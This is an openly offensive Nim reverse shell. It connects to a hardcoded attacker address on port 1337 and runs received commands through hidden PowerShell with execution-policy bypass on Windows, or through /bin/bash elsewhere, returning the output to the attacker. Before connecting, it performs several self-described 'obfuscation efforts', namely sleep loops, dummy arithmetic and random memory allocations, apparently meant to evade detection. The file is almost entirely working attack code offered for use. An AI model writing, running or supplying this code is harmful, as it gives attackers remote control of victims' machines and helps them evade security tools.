#[
    This is a simple reverse shell written in Nim.
    This program has the ability to adapt to a Windows or Linux victim on the fly by utlizing a when loop.
    I will also be looking to obfuscate this program using a couple clever programming techniques in the future.
]#

import net, osproc, strformat, times, random, system

# Obfuscation Effort 1:
let 
    now1 = now() + 8.seconds
var x = 2

while now() <= now1:
    x = x + 2

# Obfuscation Effort 2:
# Generate two random integers
let
    n1 = rand(100)
    n2 = rand(100)
# Add the two integers together
let c = n1 + n2
# Do not show the output
discard c

# Obfuscation Effort 3:
var a = alloc(1000)
dealloc(a)
# Allocate memory block on shared heap
var b = allocShared(1000)
deallocShared(b)
# Allocate and Dellocate a single int on the thread local heap
var p = create(int, sizeof(int))                # allocate memory
# create zeroes memory; createU does not.
#echo p[]                                       # 0
p[] = 123                                       # assign a value
#echo p[]                                       # 123
discard resize(p, 0)                            # deallocate it
# p is now invalid. Let's set it to nil
p = nil                                         # set pointer to nil
#echo isNil(p)                                  # true

# Obfuscation Effort 4:
proc randomMallocs() =
  var allocations = newSeq[ptr int]()
  for i in 0..rand(100):
    let size = rand(100)
    allocations.add(cast[ptr int](alloc(size * sizeof [int])))
    for j in 0..<size:
      allocations.add(cast[ptr int](alloc(size * sizeof [int])))
  for i in 0..<allocations.len:
    dealloc(allocations[i])
randomMallocs()

# Create socket:
let
    port = 1337
    address = "192.168.1.119" # Be sure to change this to your attacker_ip
    socket = newSocket()    # Be sure to change this to your listening port

# Establish connection // Connect to listener on victim machine:
socket.connect(address, Port(port))

# Run command:
when defined windows:
  #Create Prompt:
  let prompt = "N1M_SH3LL_PS> "
  while true:
      # Send prompt:
      send(socket, prompt)

      # Run command // Receive data:
      let cmd = recvLine(socket)
      let output = 
        #execProcess(fmt"powershell.exe -nop -w hidden -c {cmd}")
        execProcess(fmt"powershell -NoP -NonI -W Hidden -Exec Bypass -Command {cmd}")
      # Data Report:
      send(socket, output)
else:
  #Create Prompt:
  let prompt = "NIM_SHELL_UNIX$ "
  while true:
      # Send prompt:
      send(socket, prompt)

      # Run command // Receive data:
      let cmd = recvLine(socket)
      let output = 
          execProcess(fmt"/bin/bash -c '{cmd}'")
      # Data Report:
      send(socket, output)
